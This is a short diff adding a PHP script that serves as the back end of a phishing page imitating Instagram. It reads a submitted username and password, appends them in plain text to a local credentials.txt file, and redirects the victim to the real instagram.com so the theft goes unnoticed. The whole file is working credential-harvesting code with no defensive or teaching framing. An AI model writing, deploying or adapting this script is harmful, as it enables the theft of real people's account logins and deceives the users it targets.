@@ -1,0 +1,16 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Retrieve data from the POST request
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Save the captured data to a text file
+    $file = fopen("credentials.txt", "a");
+    fwrite($file, "Username: $username | Password: $password\n");
+    fclose($file);
+
+    // Redirect the user to the legitimate website
+    header("Location: https://instagram.com");
+    exit();
+}
+?>
